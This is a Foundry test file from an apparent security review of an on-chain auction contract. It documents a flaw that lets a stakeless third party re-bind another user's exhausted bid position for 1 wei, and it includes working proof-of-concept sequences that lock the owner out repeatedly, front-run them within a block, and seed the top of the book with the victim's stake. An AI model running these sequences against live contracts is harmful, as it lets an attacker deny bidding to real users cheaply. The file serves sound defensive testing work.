// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {Review8AccessBase} from "./Review8_access_Base.sol";
import {IGenerousAuction} from "../../src/interfaces/IGenerousAuction.sol";

/// Round-8 / access lens: `submitBid(price, amount, owner, prevTick)` lets ANY msg.sender fund a
/// bid for ANY owner. "One bid per owner" is keyed on `owner`, and a position whose live escrow
/// is 0 is re-bound to whatever price the CALLER names. So a third party with no stake and a
/// wei of currency can re-bind an exhausted position to a price its owner never chose, and
/// the owner's own next bid at their intended price then reverts `BidExists`.
///
/// Two regimes, both tested: in-band the stranger's 1-wei cap is eaten by the very next
/// emission block, so the block only holds inside one block (a front-run); OUT of the band
/// (more than `windowTicks` below the top) nothing ever pours into it, and the owner is locked
/// out of bidding until they withdraw — after which the stranger can re-bind again for 1 wei.
contract Review8_access_thirdPartyRebind is Review8AccessBase {
    address internal V = address(0xA1); // victim: staked, exhausted
    address internal W = address(0xA2); // deep top of book, 10 ticks up
    address internal ATK = address(0xBAD); // attacker: zero MONO, a few wei of INDEX

    uint256 internal constant P10 = FLOOR + 10 * SPACING;

    function setUp() public {
        _deploy(40e18, 0);
    }

    function _exhaustVictimAtP1() internal {
        _stakeFor(V, 1e18);
        _bid(V, P1, uint128(101e17), FLOOR); // cap 10 of a 40-token round: exhausts
        _round();
        assertEq(_live(V), 0, "victim exhausted in place");
        assertEq(_price(V), P1, "still bound at P1");
    }

    /// Bug-form (FAILS on current code): with a deep top ten ticks up, the stranger re-binds the
    /// exhausted victim to the floor — out of the band, so the wei never fills — and the
    /// victim's own bid at P1 a block later reverts `BidExists`. The stranger holds no MONO.
    function test_strangerRebindsOutOfBandAndLocksOwnerOut() public {
        _exhaustVictimAtP1();
        _stakeFor(W, 1e18);
        _bid(W, P10, 100_000e18, P1); // deep top: absorbs every round from here on
        assertEq(mono.balanceOf(ATK), 0, "attacker holds no MONO");
        assertEq(auction.stakes(ATK), 0, "and has no stake");

        _bidFor(ATK, V, P0, 1, FLOOR); // ONE wei of INDEX
        assertEq(_price(V), P0, "victim's position now sits at a price the victim never chose");

        vm.roll(block.number + 5);
        auction.sync(64); // emission flows; P0 is 10 ticks under the top: outside the band
        assertEq(_live(V), 1, "the stranger's wei stays live: nothing pours that far down");

        cur.mint(V, 100e18);
        vm.startPrank(V);
        cur.approve(address(auction), 100e18);
        auction.submitBid(P1, 100e18, V, FLOOR); // asserts the owner's intent wins -> BidExists
        vm.stopPrank();
        assertEq(_price(V), P1, "owner's bid at the owner's price");
    }

    /// Characterisation (PASSES): the lock-out persists across the victim's withdraw — after
    /// every `withdrawBid` the stranger re-binds again for 1 wei. Five blocks of denial cost
    /// the stranger 5 wei of INDEX (plus gas); the victim's only exit is a withdraw+bid bundle.
    function test_rebindRepeatsAfterEveryWithdraw() public {
        _exhaustVictimAtP1();
        _stakeFor(W, 1e18);
        _bid(W, P10, 100_000e18, P1);

        uint256 spent;
        for (uint256 i; i < 5; ++i) {
            _bidFor(ATK, V, P0, 1, FLOOR);
            spent += 1;
            vm.roll(block.number + 1);
            cur.mint(V, 100e18);
            vm.startPrank(V);
            cur.approve(address(auction), 100e18);
            vm.expectRevert(IGenerousAuction.BidExists.selector);
            auction.submitBid(P1, 100e18, V, FLOOR);
            auction.withdrawBid(); // victim clears the stranger's wei...
            vm.stopPrank();
            vm.roll(block.number + 1); // ...and the stranger is first in the next block
        }
        emit log_named_uint("attacker INDEX spent over 5 blocks of denial (wei)", spent);
        assertEq(spent, 5);
        assertEq(_price(V), 0, "victim withdrawn, still not at P1");
    }

    /// Characterisation (PASSES): IN the band the stranger's wei is eaten by the next emission
    /// block, so an in-band re-bind blocks the owner only within the same block (a front-run):
    /// the victim's bid in the SAME block reverts, one block later it goes through.
    function test_inBandRebindHoldsOnlyWithinTheBlock() public {
        _stakeFor(W, 1e18);
        _bid(W, P1, 100_000e18, FLOOR); // deep co-bidder: no carry ever stands
        _exhaustVictimAtP1();
        assertEq(auction.due(), 0, "book absorbed everything; nothing pending");
        _bidFor(ATK, V, P0, 1, FLOOR);
        assertEq(_price(V), P0);
        assertEq(_live(V), 1, "the wei is live in this block");

        cur.mint(V, 100e18);
        vm.startPrank(V);
        cur.approve(address(auction), 100e18);
        vm.expectRevert(IGenerousAuction.BidExists.selector);
        auction.submitBid(P1, 100e18, V, FLOOR); // same block: blocked
        vm.stopPrank();

        vm.roll(block.number + 1);
        vm.startPrank(V);
        auction.submitBid(P1, 100e18, V, FLOOR); // next block: the wei was poured, re-bind passes
        vm.stopPrank();
        assertEq(_price(V), P1, "one block later the owner is through");
    }

    /// Characterisation (PASSES): a stranger can bind the victim's STAKE to the top of the
    /// price range (1e4 x floor) with 1e4 wei, raising `highestTick` and seeding a new tick —
    /// the stranger needs no stake of their own to do what a wall-builder needs a wallet for.
    function test_strangerSeedsTopOfBookWithVictimsStake() public {
        _exhaustVictimAtP1();
        uint256 top = FLOOR * 1e4;
        _bidFor(ATK, V, top, uint128(1e4), P1);
        assertEq(auction.highestTick(), top, "new high-water set by a stranger using V's stake");
        assertEq(_price(V), top);
        (,, uint256 cap, uint256 stakeSum,,,) = auction.ticks(top);
        assertEq(cap, 1, "1 wei of capacity");
        assertEq(stakeSum, 1e18, "victim's whole stake now weighs at 10,000x the floor");
    }

    /// Negative result (PASSES): a stranger cannot re-bind a position with LIVE escrow, cannot
    /// top up an inert (un-staked) owner, and a same-price top-up is a gift the owner keeps —
    /// the stranger's escrow becomes the owner's, withdrawable by the owner only.
    function test_strangerCannotMoveLiveEscrowOrTopUpInert() public {
        _stakeFor(V, 1e18);
        _bid(V, P1, 100e18, FLOOR);

        cur.mint(ATK, 10);
        vm.startPrank(ATK);
        cur.approve(address(auction), 10);
        vm.expectRevert(IGenerousAuction.BidExists.selector);
        auction.submitBid(P0, 1, V, FLOOR);
        vm.stopPrank();

        _bidFor(ATK, V, P1, 5e18, FLOOR); // same price: top-up
        assertEq(_live(V), 105e18, "gift lands in V's position");
        vm.prank(V);
        assertEq(auction.withdrawBid(), 105e18, "and only V can take it out");

        vm.prank(V);
        auction.unstake(1e18);
        cur.mint(ATK, 10);
        vm.startPrank(ATK);
        cur.approve(address(auction), 10);
        vm.expectRevert(IGenerousAuction.NoStake.selector);
        auction.submitBid(P1, 2, V, FLOOR);
        vm.stopPrank();
    }

    /// Negative result (PASSES): forcing a harvest every other block via 2-wei third-party
    /// top-ups changes nothing against an identical untouched co-staker — measured diff 0 wei
    /// over 50 forced harvests. Harvest cadence is not a lever, reserve booking included.
    function test_forcedHarvestCadenceIsRoundingOnly() public {
        address U = address(0xA3);
        _stakeFor(V, 1e18);
        _stakeFor(U, 1e18);
        _bid(V, P1, 1010e18, FLOOR);
        _bid(U, P1, 1010e18, FLOOR);

        uint256 n = 50;
        for (uint256 i; i < n; ++i) {
            vm.roll(block.number + 2);
            _bidFor(ATK, V, P1, 2, FLOOR); // syncs, harvests V, re-seats V; U untouched
        }
        vm.roll(block.number + K);
        auction.sync(64);
        uint256 ov = _owed(V);
        uint256 ou = _owed(U);
        emit log_named_uint("owed(V) harvested 50x", ov);
        emit log_named_uint("owed(U) never harvested", ou);
        uint256 diff = ov > ou ? ov - ou : ou - ov;
        emit log_named_uint("abs diff (wei)", diff);
        assertLe(diff, n + 2, "forced harvests cost at most ~1 wei each");
        // The pot side: 51 pours with 2 seats each reserve 51 wei; what each claimant actually
        // receives against what it is owed.
        emit log_named_uint("tokensSold", auction.tokensSold());
        emit log_named_uint("tokensBooked", auction.tokensBooked());
        emit log_named_uint("tokensUnclaimed", auction.tokensUnclaimed());
        uint256 gotV = auction.claim(V);
        emit log_named_uint("tokensMinted after the pack", auction.tokensMinted());
        emit log_named_uint("held after V's claim", mono.balanceOf(address(auction)) - auction.totalStaked());
        uint256 gotU = auction.claim(U);
        emit log_named_uint("claim(V) paid", gotV);
        emit log_named_uint("claim(U) paid", gotU);
        emit log_named_uint("V shortfall vs owed (wei)", ov - gotV);
        emit log_named_uint("U shortfall vs owed (wei)", ou - gotU);
        assertLe(ov - gotV + (ou - gotU), 2 * (n + 1), "total dust within the documented reserve");
    }
}
